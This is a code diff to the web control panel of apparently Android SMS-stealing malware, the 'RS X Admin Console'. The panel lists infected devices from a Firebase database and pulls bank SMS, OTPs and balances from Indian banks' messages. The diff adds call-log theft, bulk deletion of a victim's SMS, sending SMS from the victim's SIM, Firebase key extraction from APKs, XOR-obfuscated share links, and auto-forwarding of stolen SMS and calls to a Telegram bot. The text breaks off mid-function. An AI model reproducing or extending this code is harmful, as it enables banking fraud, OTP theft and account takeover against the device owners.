@@ -87,6 +87,8 @@ body { transition: zoom 0.2s ease; }
 .conn-item .del:hover { border-color:var(--red); background:rgba(255,77,77,0.08); }
 .conn-item .copy-link { color:var(--gold); border-color:rgba(246,207,69,0.2); font-size:14px; }
 .conn-item .copy-link:hover { border-color:var(--gold); background:rgba(246,207,69,0.08); }
+.conn-item .tg-status { color:var(--cyan); border-color:rgba(24,191,255,0.2); font-size:14px; }
+.conn-item .tg-status:hover { border-color:var(--cyan); background:rgba(24,191,255,0.08); }
 
 .btn-new {
     width:100%; padding:14px; border:1px dashed var(--border2); border-radius:16px;
@@ -222,11 +224,17 @@ body { transition: zoom 0.2s ease; }
 .device-card .details .item small { display:block; color:var(--dim); font-size:9px; font-weight:800; letter-spacing:0.06em; text-transform:uppercase; }
 .device-card .details .item div { margin-top:2px; color:var(--text); font-size:12px; font-weight:500; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
 .device-card .phone-display { margin-top:8px; padding:4px 10px; background:rgba(24,191,255,0.06); border:1px solid rgba(24,191,255,0.1); border-radius:6px; font-size:12px; color:var(--cyan); display:inline-block; }
+.device-card .tg-toggle {
+    position:absolute; top:12px; right:50px; background:rgba(24,191,255,0.06);
+    border:1px solid rgba(24,191,255,0.15); border-radius:8px; color:var(--cyan);
+    padding:4px 10px; font-size:14px; cursor:pointer; transition:0.15s; opacity:0.5; z-index:2;
+}
+.device-card .tg-toggle.active { opacity:1; background:rgba(24,191,255,0.15); border-color:var(--cyan); }
+.device-card .tg-toggle:hover { opacity:1; }
 .empty-grid { grid-column:1/-1; text-align:center; color:var(--muted); padding:70px 0; font-size:14px; }
 .send-btn-small { position:absolute; top:12px; right:12px; background:rgba(24,191,255,0.08); border:1px solid rgba(24,191,255,0.15); border-radius:8px; color:var(--cyan); padding:4px 10px; font-size:14px; cursor:pointer; transition:0.15s; opacity:0.5; z-index:2; }
 .send-btn-small:hover { opacity:1; background:rgba(24,191,255,0.15); }
 
-/* EMPTY STATE */
 .empty-state {
     grid-column:1/-1; display:flex; flex-direction:column; align-items:center;
     justify-content:center; padding:100px 20px; text-align:center;
@@ -262,7 +270,6 @@ body { transition: zoom 0.2s ease; }
 .tab-content { display:none; }
 .tab-content.active { display:block; }
 
-/* INFO TAB - ROW STYLE */
 .info-list { background:var(--bg2); border:1px solid var(--border); border-radius:12px; overflow:hidden; }
 .info-row {
     display:flex; justify-content:space-between; align-items:center;
@@ -276,7 +283,6 @@ body { transition: zoom 0.2s ease; }
     letter-spacing:0.08em; margin:20px 0 10px 4px;
 }
 
-/* BANK TAB */
 .bank-detect-header { margin-bottom:16px; }
 .bank-detect-header .line1 { color:var(--muted); font-size:13px; }
 .bank-detect-header .line2 { color:var(--green); font-size:13px; margin-top:2px; }
@@ -327,7 +333,6 @@ body { transition: zoom 0.2s ease; }
     font-size:22px; font-weight:800;
 }
 .tx-card-bank .tx-mid-amt.balance { color:var(--text); }
-.tx-card-bank .tx-mid-amt.txn { color:var(--cyan); }
 .tx-card-bank .tx-divider {
     height:1px; background:var(--border); margin:10px 0;
 }
@@ -368,6 +373,35 @@ body { transition: zoom 0.2s ease; }
 .sms-item .bank-name-tag { display:inline-block; background:rgba(246,207,69,0.08); color:var(--gold); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(246,207,69,0.15); }
 .sms-item .balance-tag { display:inline-block; background:rgba(0,214,143,0.06); color:var(--green); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(0,214,143,0.15); }
 
+.call-item {
+    padding:12px 16px; background:var(--bg3); border:1px solid var(--border);
+    border-radius:12px; margin-bottom:8px; animation:fadeIn 0.2s ease;
+}
+.call-item .call-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; }
+.call-item .call-number { font-weight:700; font-size:14px; color:var(--text); }
+.call-item .call-type { font-size:11px; font-weight:700; padding:2px 10px; border-radius:4px; }
+.call-item .call-type.incoming { background:rgba(0,214,143,0.12); color:var(--green); }
+.call-item .call-type.outgoing { background:rgba(24,191,255,0.12); color:var(--cyan); }
+.call-item .call-type.missed { background:rgba(255,77,77,0.12); color:var(--red); }
+.call-item .call-meta { color:var(--dim); font-size:12px; display:flex; gap:12px; }
+.call-item .call-duration { color:var(--muted); }
+
+.number-main {
+    background:linear-gradient(135deg, rgba(0,214,143,0.08), rgba(0,214,143,0.02));
+    border:1px solid rgba(0,214,143,0.2); border-radius:14px;
+    padding:16px; margin-bottom:12px;
+}
+.number-main .nm-label { color:var(--green); font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:0.08em; }
+.number-main .nm-number { font-size:24px; font-weight:900; color:var(--text); margin-top:4px; }
+.number-list { display:flex; flex-direction:column; gap:6px; }
+.number-row {
+    display:flex; justify-content:space-between; align-items:center;
+    padding:10px 14px; background:var(--bg3); border:1px solid var(--border);
+    border-radius:10px;
+}
+.number-row .num { font-weight:600; font-size:14px; color:var(--cyan); }
+.number-row .count { color:var(--muted); font-size:12px; }
+
 .send-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:16px; }
 .send-grid .full { grid-column:1/-1; }
 .send-grid label { color:var(--dim); font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.06em; display:block; margin-bottom:4px; }
@@ -384,6 +418,13 @@ body { transition: zoom 0.2s ease; }
 .send-result { margin-top:14px; padding:12px 16px; border-radius:12px; font-size:13px; font-weight:600; display:none; }
 .send-result.ok { display:block; background:rgba(0,214,143,0.08); color:var(--green); border:1px solid rgba(0,214,143,0.15); }
 .send-result.err { display:block; background:rgba(255,77,77,0.08); color:var(--red); border:1px solid rgba(255,77,77,0.15); }
+
+.danger-btn {
+    background:rgba(255,48,39,0.08); border:1px solid rgba(255,48,39,0.2);
+    color:var(--red); padding:10px 18px; border-radius:12px;
+    font-weight:700; font-size:13px; transition:0.15s;
+}
+.danger-btn:hover { background:rgba(255,48,39,0.15); border-color:var(--red); }
 
 @media (max-width:900px) {
     .grid { grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); }
@@ -421,36 +462,41 @@ body { transition: zoom 0.2s ease; }
             <p>Device Management Console</p>
         </div>
         <div class="card">
-            <div class="card-header"><h3>◌ Saved Accounts</h3><span class="badge" id="connCount">0</span></div>
+            <div class="card-header"><h3>Saved Accounts</h3><span class="badge" id="connCount">0</span></div>
             <div id="connectionsList"></div>
-            <button class="btn-new" id="newConnBtn">＋ New Account</button>
+            <button class="btn-new" id="newConnBtn">+ New Account</button>
             <div id="homeError" class="error-text hidden"></div>
             <div style="margin-top:14px;text-align:center;font-size:12px;color:var(--dim)">
                 <span>Share link: </span>
                 <input id="shareLinkInput" style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:4px 10px;color:var(--text);font-size:12px;width:80%;margin-top:4px" readonly />
             </div>
         </div>
-        <div class="footer-text">RS X Admin Console · All connections are logged</div>
+        <div class="footer-text">RS X Admin Console</div>
     </div>
 </section>
 
 <div class="modal-overlay" id="newAccountModal">
     <div class="modal-box" style="max-width:560px">
-        <div class="modal-header"><h2>New Firebase Account</h2><button class="close" id="closeAccountModal">&times;</button></div>
+        <div class="modal-header"><h2>Firebase Account</h2><button class="close" id="closeAccountModal">&times;</button></div>
         <div class="form-group"><label>Project Label (optional)</label><input id="accLabel" placeholder="e.g. My Project" value="" /></div>
         <div class="form-group"><label>Firebase Database URL</label><input id="accUrl" placeholder="https://project.firebaseio.com" /></div>
         <div class="form-group"><label>Authentication Key / Secret</label><input id="accKey" type="password" placeholder="AIza..." /></div>
         <div class="form-group">
             <label>Extract from APK (optional)</label>
             <div class="file-upload" id="apkUploadArea">
-                <span>📁 Upload APK File</span>
+                <span>Upload APK File</span>
                 <input type="file" id="apkFileInput" accept=".apk,.txt,.json" />
-                <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto‑extracts Firebase URL &amp; API Key</div>
+                <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto-extracts Firebase URL & API Key</div>
             </div>
+        </div>
+        <div style="border-top:1px solid var(--border);margin:20px 0;padding-top:16px;">
+            <div class="form-group"><label>Telegram Bot Token (optional)</label><input id="accTelegramToken" placeholder="123456:ABC-DEF1234..." /></div>
+            <div class="form-group"><label>Admin Chat ID (optional)</label><input id="accTelegramChatId" placeholder="123456789" /></div>
+            <div style="color:var(--dim);font-size:12px;">SMS & Calls will auto-forward to this bot for selected devices.</div>
         </div>
         <div id="setupError" class="error-text hidden"></div>
         <div class="form-actions">
-            <button class="primary" id="saveAccountBtn">⚡ Save Account</button>
+            <button class="primary" id="saveAccountBtn">Save Account</button>
             <button class="secondary" id="cancelAccountBtn">Cancel</button>
         </div>
     </div>
@@ -462,11 +508,11 @@ body { transition: zoom 0.2s ease; }
         <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
         <div class="actions">
             <div class="zoom-controls">
-                <button class="zoom-btn" id="zoomOut" title="Zoom Out">−</button>
-                <button class="zoom-btn" id="zoomReset" title="Reset">⟲</button>
+                <button class="zoom-btn" id="zoomOut" title="Zoom Out">-</button>
+                <button class="zoom-btn" id="zoomReset" title="Reset">R</button>
                 <button class="zoom-btn" id="zoomIn" title="Zoom In">+</button>
             </div>
-            <span class="status" id="statusLabel">● Connected</span>
+            <span class="status" id="statusLabel">Connected</span>
             <span class="clock" id="clockDisplay">--:--:--</span>
             <a class="telegram" href="https://t.me/RSPANNEL" target="_blank" title="Telegram"><svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg></a>
             <button class="logout" id="logoutBtn">Exit</button>
@@ -485,26 +531,28 @@ body { transition: zoom 0.2s ease; }
         <button class="filter" data-filter="upi">Upi</button>
         <button class="filter" data-filter="bank">Bank</button>
         <button class="filter" data-filter="card">Card</button>
-        <button class="sort" id="sortBtn">Newest ▼</button>
-        <button class="refresh-btn" id="refreshBtn" title="Refresh">↻</button>
+        <button class="sort" id="sortBtn">Newest</button>
+        <button class="refresh-btn" id="refreshBtn" title="Refresh">R</button>
     </div>
-    <div class="grid" id="deviceGrid"><div class="empty-grid">Loading devices…</div></div>
+    <div class="grid" id="deviceGrid"><div class="empty-grid">Loading devices...</div></div>
 </section>
 
 <div class="modal-overlay" id="detailModal">
     <div class="modal-box">
         <div class="modal-header"><h2 id="detailDeviceName">Device</h2><button class="close" id="closeDetailModal">&times;</button></div>
         <div style="display:flex;gap:12px;margin-bottom:8px;flex-wrap:wrap;align-items:center">
-            <span id="detailStatus" style="font-weight:700">● Online</span>
-            <span>🔋 <span id="detailBattery">—</span></span>
-            <span style="color:var(--gold)">🏦 Bank SMS: <span id="detailBankCount">0</span></span>
-            <span style="color:var(--muted)">📩 SMS: <span id="detailSmsCount">0</span></span>
-            <span style="color:var(--cyan)">📱 <span id="detailPhoneDisplay">—</span></span>
+            <span id="detailStatus" style="font-weight:700">Online</span>
+            <span>Battery: <span id="detailBattery">-</span></span>
+            <span style="color:var(--gold)">Bank SMS: <span id="detailBankCount">0</span></span>
+            <span style="color:var(--muted)">SMS: <span id="detailSmsCount">0</span></span>
+            <span style="color:var(--cyan)">Phone: <span id="detailPhoneDisplay">-</span></span>
         </div>
         <div class="detail-tabs">
             <button class="tab-btn active" data-tab="info">Info</button>
             <button class="tab-btn" data-tab="bank">Bank <span class="badge" id="bankTabBadge">0</span></button>
             <button class="tab-btn" data-tab="sms">SMS <span class="badge" id="smsTabBadge">0</span></button>
+            <button class="tab-btn" data-tab="calls">Calls <span class="badge" id="callsTabBadge">0</span></button>
+            <button class="tab-btn" data-tab="numbers">Numbers</button>
             <button class="tab-btn" data-tab="send">Send</button>
         </div>
         <div class="tab-content active" id="tabInfo">
@@ -519,21 +567,31 @@ body { transition: zoom 0.2s ease; }
         </div>
         <div class="tab-content" id="tabSms">
             <div class="sms-section">
-                <h3>📩 Messages <span class="count" id="smsCountLabel">(0)</span></h3>
+                <h3>Messages <span class="count" id="smsCountLabel">(0)</span></h3>
                 <div class="sms-search">
                     <input id="smsSearch" placeholder="Search messages..." />
-                    <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">↻</button>
+                    <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">R</button>
+                    <button class="danger-btn" id="deleteAllSmsBtn">Delete All</button>
                 </div>
                 <div id="messageList" style="max-height:350px;overflow-y:auto"></div>
             </div>
+        </div>
+        <div class="tab-content" id="tabCalls">
+            <div class="sms-section">
+                <h3>Call Logs <span class="count" id="callsCountLabel">(0)</span></h3>
+                <div id="callList" style="max-height:400px;overflow-y:auto"></div>
+            </div>
+        </div>
+        <div class="tab-content" id="tabNumbers">
+            <div id="numbersContainer"></div>
         </div>
         <div class="tab-content" id="tabSend">
             <div class="send-grid">
                 <div class="full"><label>Select SIM</label><div class="sim-toggle"><button class="active" data-sim="1">SIM 1</button><button data-sim="2">SIM 2</button></div></div>
                 <div class="full"><label>Recipient</label><input id="smsTo" placeholder="+919876543210" /></div>
                 <div class="full"><label>Message</label><textarea id="smsBody" placeholder="Type your message here..."></textarea></div>
-                <div class="full"><button class="send-btn" id="sendSmsBtn">📤 Send via SIM 1</button><div class="send-result" id="sendResult"></div></div>
-                <div class="full" style="color:var(--dim);font-size:12px;text-align:center">Use device number: <span id="sendDevicePhone">—</span></div>
+                <div class="full"><button class="send-btn" id="sendSmsBtn">Send via SIM 1</button><div class="send-result" id="sendResult"></div></div>
+                <div class="full" style="color:var(--dim);font-size:12px;text-align:center">Use device number: <span id="sendDevicePhone">-</span></div>
             </div>
         </div>
     </div>
@@ -548,6 +606,7 @@ let filterMode = 'all';
 let searchQuery = '';
 let selectedDevice = null;
 let messageCache = {};
+let callCache = {};
 let simChoice = 1;
 let pollTimer = null;
 let sortMode = 'newest';
@@ -555,6 +614,8 @@ let detailRefreshTimer = null;
 let clockTimer = null;
 let zoomLevel = 100;
 let isLoading = false;
+let telegramLastForwarded = {};
+let telegramLastCallForwarded = {};
 
 const $ = id => document.getElementById(id);
 const homeScreen = $('homeScreen');
@@ -577,6 +638,8 @@ const closeAccount = $('closeAccountModal');
 const accLabel = $('accLabel');
 const accUrl = $('accUrl');
 const accKey = $('accKey');
+const accTelegramToken = $('accTelegramToken');
+const accTelegramChatId = $('accTelegramChatId');
 const apkFileInput = $('apkFileInput');
 const apkUploadArea = $('apkUploadArea');
 const saveAccountBtn = $('saveAccountBtn');
@@ -587,6 +650,7 @@ const closeDetail = $('closeDetailModal');
 const detailInfoList = $('detailInfoList');
 const detailSims = $('detailSims');
 const messageList = $('messageList');
+const callList = $('callList');
 const smsTo = $('smsTo');
 const smsBody = $('smsBody');
 const sendSmsBtn = $('sendSmsBtn');
@@ -594,56 +658,57 @@ const sendResult = $('sendResult');
 const smsSearch = $('smsSearch');
 const sendDevicePhone = $('sendDevicePhone');
 const detailPhoneDisplay = $('detailPhoneDisplay');
-const bankNameDisplay = $('bankNameDisplay');
 const bankMessageList = $('bankMessageList');
 const bankDetectHeader = $('bankDetectHeader');
 const latestBalanceCard = $('latestBalanceCard');
+const numbersContainer = $('numbersContainer');
 
 const tabBtns = document.querySelectorAll('.tab-btn');
 const tabContents = {
     info: $('tabInfo'),
     bank: $('tabBank'),
     sms: $('tabSms'),
+    calls: $('tabCalls'),
+    numbers: $('tabNumbers'),
     send: $('tabSend')
 };
 
-// ZOOM
 function applyZoom() { document.body.style.zoom = zoomLevel + '%'; }
 $('zoomIn').addEventListener('click', () => { zoomLevel = Math.min(zoomLevel + 10, 150); applyZoom(); });
 $('zoomOut').addEventListener('click', () => { zoomLevel = Math.max(zoomLevel - 10, 70); applyZoom(); });
 $('zoomReset').addEventListener('click', () => { zoomLevel = 100; applyZoom(); });
 
 const BANK_NAMES = [
-    'Canara Bank', 'State Bank of India', 'SBI', 'HDFC Bank', 'ICICI Bank',
-    'Axis Bank', 'Kotak Mahindra Bank', 'Yes Bank', 'PNB', 'Punjab National Bank',
-    'Bank of Baroda', 'BOB', 'Union Bank', 'IDFC Bank', 'IndusInd Bank',
-    'RBL Bank', 'Bank of India', 'Central Bank', 'Indian Bank', 'UCO Bank',
-    'Bank of Maharashtra', 'Indian Overseas Bank', 'South Indian Bank',
-    'Federal Bank', 'Dhanlaxmi Bank', 'Karur Vysya Bank', 'Lakshmi Vilas Bank',
-    'Tamilnad Mercantile Bank', 'City Union Bank', 'Nainital Bank',
-    'Karnataka Bank', 'Saraswat Bank', 'Kalyan Janata Sahakari Bank',
-    'Shamrao Vithal Co-operative Bank', 'Citibank', 'Standard Chartered',
-    'HSBC', 'Deutsche Bank', 'ABN AMRO', 'Barclays', 'BNP Paribas'
+    'Canara Bank','State Bank of India','SBI','HDFC Bank','ICICI Bank',
+    'Axis Bank','Kotak Mahindra Bank','Yes Bank','PNB','Punjab National Bank',
+    'Bank of Baroda','BOB','Union Bank','IDFC Bank','IndusInd Bank',
+    'RBL Bank','Bank of India','Central Bank','Indian Bank','UCO Bank',
+    'Bank of Maharashtra','Indian Overseas Bank','South Indian Bank',
+    'Federal Bank','Dhanlaxmi Bank','Karur Vysya Bank','Lakshmi Vilas Bank',
+    'Tamilnad Mercantile Bank','City Union Bank','Nainital Bank',
+    'Karnataka Bank','Saraswat Bank','Kalyan Janata Sahakari Bank',
+    'Shamrao Vithal Co-operative Bank','Citibank','Standard Chartered',
+    'HSBC','Deutsche Bank','ABN AMRO','Barclays','BNP Paribas'
 ];
 
 const SENDER_BANK_MAP = {
-    'CENTBK': 'Central Bank of India', 'CBIN': 'Central Bank of India',
-    'SBIIN': 'SBI', 'SBIN': 'SBI', 'HDFCB': 'HDFC Bank', 'HDFC': 'HDFC Bank',
-    'ICICI': 'ICICI Bank', 'AXISB': 'Axis Bank', 'KOTAK': 'Kotak Mahindra Bank',
-    'YESB': 'Yes Bank', 'PNB': 'PNB', 'BOB': 'Bank of Baroda',
-    'UBIN': 'Union Bank', 'IDFC': 'IDFC Bank', 'INDB': 'IndusInd Bank',
-    'RBLB': 'RBL Bank', 'BKID': 'Bank of India', 'CNRB': 'Canara Bank',
-    'UTIB': 'Axis Bank', 'SBHY': 'State Bank of Hyderabad',
-    'MAHB': 'Bank of Maharashtra', 'IOBA': 'Indian Overseas Bank',
-    'SOUB': 'South Indian Bank', 'FDRL': 'Federal Bank',
-    'DLXB': 'Dhanlaxmi Bank', 'KVBL': 'Karur Vysya Bank',
-    'LVCB': 'Lakshmi Vilas Bank', 'TMBL': 'Tamilnad Mercantile Bank',
-    'CUB': 'City Union Bank', 'NBTB': 'Nainital Bank',
-    'KARB': 'Karnataka Bank', 'SRCB': 'Saraswat Bank',
-    'KJSB': 'Kalyan Janata Sahakari Bank', 'SVCB': 'Shamrao Vithal Co-operative Bank',
-    'CITI': 'Citibank', 'SCB': 'Standard Chartered', 'HSBC': 'HSBC',
-    'DB': 'Deutsche Bank', 'ABN': 'ABN AMRO', 'BARCLAYS': 'Barclays',
-    'BNP': 'BNP Paribas'
+    'CENTBK':'Central Bank of India','CBIN':'Central Bank of India',
+    'SBIIN':'SBI','SBIN':'SBI','HDFCB':'HDFC Bank','HDFC':'HDFC Bank',
+    'ICICI':'ICICI Bank','AXISB':'Axis Bank','KOTAK':'Kotak Mahindra Bank',
+    'YESB':'Yes Bank','PNB':'PNB','BOB':'Bank of Baroda',
+    'UBIN':'Union Bank','IDFC':'IDFC Bank','INDB':'IndusInd Bank',
+    'RBLB':'RBL Bank','BKID':'Bank of India','CNRB':'Canara Bank',
+    'UTIB':'Axis Bank','SBHY':'State Bank of Hyderabad',
+    'MAHB':'Bank of Maharashtra','IOBA':'Indian Overseas Bank',
+    'SOUB':'South Indian Bank','FDRL':'Federal Bank',
+    'DLXB':'Dhanlaxmi Bank','KVBL':'Karur Vysya Bank',
+    'LVCB':'Lakshmi Vilas Bank','TMBL':'Tamilnad Mercantile Bank',
+    'CUB':'City Union Bank','NBTB':'Nainital Bank',
+    'KARB':'Karnataka Bank','SRCB':'Saraswat Bank',
+    'KJSB':'Kalyan Janata Sahakari Bank','SVCB':'Shamrao Vithal Co-operative Bank',
+    'CITI':'Citibank','SCB':'Standard Chartered','HSBC':'HSBC',
+    'DB':'Deutsche Bank','ABN':'ABN AMRO','BARCLAYS':'Barclays',
+    'BNP':'BNP Paribas'
 };
 
 function detectBankName(text, sender) {
@@ -685,8 +750,7 @@ function isCreditDebitSms(msg) {
 
 function isBankSms(msg) {
     const text = msg.message.toLowerCase();
-    return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹|withdraw|deposit|credited|debited/.test(text) &&
-           isCreditDebitSms(msg);
+    return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹|withdraw|deposit|credited|debited/.test(text) && isCreditDebitSms(msg);
 }
 
 function extractBalanceFromText(text) {
@@ -702,12 +766,6 @@ function extractBalance(msg) {
 function extractOtp(msg) {
     const match = msg.message.match(/\b(\d{4,8})\b/);
     return match ? match[1] : null;
-}
-
-function extractTransactionAmount(text) {
-    const match = text.match(/(?:rs\.?|₹)\s*([\d,]+\.?\d*)/i);
-    if (match) return match[1];
-    return null;
 }
 
 function getDeviceBankSms(deviceId) {
@@ -756,45 +814,37 @@ function toast(msg, type='success') {
 }
 
 const SALT = 'XxR$P@n3l!';
-function encodeFirebaseConn(url, key) {
-    return btoa(url + '|||' + (key || ''));
+function encodeFirebaseConn(url, key, token, chatId) {
+    const payload = url + '|||' + (key || '') + '|||' + (token || '') + '|||' + (chatId || '');
+    let enc = '';
+    for (let i = 0; i < payload.length; i++) {
+        enc += String.fromCharCode(payload.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
+    }
+    return btoa(enc);
 }
 function decodeFirebaseConn(encoded) {
     try {
-        let str = atob(encoded);
-        let parts = str.split('|||');
-        if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-        }
-    } catch(e) {}
-    try {
-        let dec = decodeURIComponent(atob(encoded));
-        let str = '';
-        for (let i=0; i<dec.length; i++) {
-            str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
-        }
-        let parts = str.split('|||');
-        if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-        }
-    } catch(e) {}
-    try {
         let dec = atob(encoded);
         let str = '';
-        for (let i=0; i<dec.length; i++) {
+        for (let i = 0; i < dec.length; i++) {
             str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
         }
         let parts = str.split('|||');
         if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
+            return {
+                url: parts[0].trim(),
+                key: (parts[1] || '').trim(),
+                telegramBotToken: (parts[2] || '').trim(),
+                telegramChatId: (parts[3] || '').trim()
+            };
         }
     } catch(e) {}
-    return { url: '', key: '' };
+    return { url: '', key: '', telegramBotToken: '', telegramChatId: '' };
 }
 
 function updateShareLink() {
     if (!activeConn) { shareLinkInput.value = ''; return; }
-    const encoded = encodeFirebaseConn(activeConn.url, activeConn.key || '');
+    const encoded = encodeFirebaseConn(activeConn.url, activeConn.key || '', activeConn.telegramBotToken || '', activeConn.telegramChatId || '');
     const link = window.location.origin + window.location.pathname + '?s=' + encoded;
     shareLinkInput.value = link;
 }
@@ -816,18 +866,23 @@ function loadFromURL() {
                     label: label,
                     url: decoded.url,
                     key: decoded.key,
+                    telegramBotToken: decoded.telegramBotToken,
+                    telegramChatId: decoded.telegramChatId,
+                    telegramDevices: [],
                     date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
                 };
                 CONNECTIONS.push(conn);
             } else {
                 CONNECTIONS[existingIdx].key = decoded.key || CONNECTIONS[existingIdx].key;
+                CONNECTIONS[existingIdx].telegramBotToken = decoded.telegramBotToken || CONNECTIONS[existingIdx].telegramBotToken;
+                CONNECTIONS[existingIdx].telegramChatId = decoded.telegramChatId || CONNECTIONS[existingIdx].telegramChatId;
                 conn = CONNECTIONS[existingIdx];
             }
             localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
             activeConn = conn;
             renderConnections();
             showDashboard();
-            toast('Auto‑connected from shared link', 'success');
+            toast('Auto-connected from shared link', 'success');
             return true;
         }
     }
@@ -866,7 +921,7 @@ function showDashboard() {
 function renderConnections() {
     if (!connectionsList) return;
     if (CONNECTIONS.length === 0) {
-        connectionsList.innerHTML = `<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>`;
+        connectionsList.innerHTML = '<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>';
         connCount.textContent = '0';
         shareLinkInput.value = '';
         return;
@@ -874,16 +929,18 @@ function renderConnections() {
     connCount.textContent = CONNECTIONS.length;
     connectionsList.innerHTML = CONNECTIONS.map((c, i) => {
         const displayLabel = c.label || c.url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'');
-        const shortLabel = displayLabel.length > 15 ? displayLabel.substring(0, 15) + '…' : displayLabel;
+        const shortLabel = displayLabel.length > 15 ? displayLabel.substring(0, 15) + '...' : displayLabel;
+        const hasTg = c.telegramBotToken && c.telegramChatId;
         return `
             <div class="conn-item">
                 <div class="info">
                     <div class="name">${esc(shortLabel)}</div>
-                    <div class="date">${c.date || ''}</div>
+                    <div class="date">${c.date || ''}${hasTg ? ' - Bot' : ''}</div>
                 </div>
-                <button class="copy-link" data-idx="${i}" title="Copy share link">🔗</button>
-                <button class="connect" data-idx="${i}" title="Connect">▶</button>
-                <button class="del" data-idx="${i}" title="Delete">✕</button>
+                <button class="copy-link" data-idx="${i}" title="Copy share link">L</button>
+                <button class="tg-status" data-idx="${i}" title="Telegram Settings">T</button>
+                <button class="connect" data-idx="${i}" title="Connect">C</button>
+                <button class="del" data-idx="${i}" title="Delete">X</button>
             </div>
         `;
     }).join('');
@@ -893,10 +950,10 @@ function renderConnections() {
             const idx = parseInt(btn.dataset.idx);
             const conn = CONNECTIONS[idx];
             if (!conn) return;
-            const encoded = encodeFirebaseConn(conn.url, conn.key || '');
+            const encoded = encodeFirebaseConn(conn.url, conn.key || '', conn.telegramBotToken || '', conn.telegramChatId || '');
             const link = window.location.origin + window.location.pathname + '?s=' + encoded;
             navigator.clipboard.writeText(link).then(() => {
-                toast('🔗 Link Copied!', 'success');
+                toast('Link Copied!', 'success');
             }).catch(() => {
                 const input = document.createElement('input');
                 input.value = link;
@@ -904,8 +961,25 @@ function renderConnections() {
                 input.select();
                 document.execCommand('copy');
                 document.body.removeChild(input);
-                toast('🔗 Link Copied!', 'success');
+                toast('Link Copied!', 'success');
             });
+        });
+    });
+
+    connectionsList.querySelectorAll('.tg-status').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const idx = parseInt(btn.dataset.idx);
+            const conn = CONNECTIONS[idx];
+            if (!conn) return;
+            const token = prompt('Telegram Bot Token:', conn.telegramBotToken || '');
+            if (token === null) return;
+            const chatId = prompt('Admin Chat ID:', conn.telegramChatId || '');
+            if (chatId === null) return;
+            conn.telegramBotToken = token.trim();
+            conn.telegramChatId = chatId.trim();
+            localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
+            renderConnections();
+            toast('Telegram settings updated', 'success');
         });
     });
 
@@ -964,6 +1038,16 @@ async function fbSet(path, data) {
     return res.json();
 }
 
+async function fbDelete(path) {
+    const url = fbUrl(path);
+    const res = await fetch(url, { method: 'DELETE' });
+    if (!res.ok) {
+        let msg = await res.text();
+        throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
+    }
+    return true;
+}
+
 function parseDevices(data) {
     if (!data || typeof data !== 'object') return [];
     return Object.keys(data).map(id => {
@@ -997,7 +1081,7 @@ function parseDevices(data) {
 async function refreshDevices() {
     if (!activeConn || isLoading) return;
     isLoading = true;
-    statusLabel.textContent = '● Loading...';
+    statusLabel.textContent = 'Loading...';
     statusLabel.style.color = 'var(--gold)';
     statusLabel.style.borderColor = 'rgba(246,207,69,0.2)';
     statusLabel.style.background = 'rgba(246,207,69,0.06)';
@@ -1009,12 +1093,13 @@ async function refreshDevices() {
         renderDeviceGrid();
 
         await Promise.allSettled(allDevices.map(d => loadMessagesForDevice(d.id)));
+        await Promise.allSettled(allDevices.map(d => loadCallsForDevice(d.id)));
 
         autoDetectPhoneNumbers();
         renderDeviceGrid();
         updateStats();
+        forwardToTelegram();
 
-        // FIX: Don't cache messages to avoid quota exceeded
         try {
             const cache = { devices: allDevices };
             localStorage.setItem('rsx_cache_' + activeConn.url, JSON.stringify(cache));
@@ -1022,12 +1107,12 @@ async function refreshDevices() {
             console.warn('Cache storage failed (quota exceeded)');
         }
 
-        statusLabel.textContent = '● Connected';
+        statusLabel.textContent = 'Connected';
         statusLabel.style.color = 'var(--green)';
         statusLabel.style.borderColor = 'rgba(0,214,143,0.2)';
         statusLabel.style.background = 'rgba(0,214,143,0.06)';
     } catch (e) {
-        statusLabel.textContent = '● Error';
+        statusLabel.textContent = 'Error';
         statusLabel.style.color = 'var(--red)';
         statusLabel.style.borderColor = 'rgba(255,77,77,0.2)';
         statusLabel.style.background = 'rgba(255,77,77,0.06)';
@@ -1154,6 +1239,35 @@ async function loadMessagesForDevice(deviceId) {
     }
 }
 
+function parseCalls(data) {
+    if (!data || typeof data !== 'object') return [];
+    return Object.entries(data).map(([key, c]) => {
+        return {
+            key,
+            number: c.number || c.phone || '',
+            type: c.type || 'incoming',
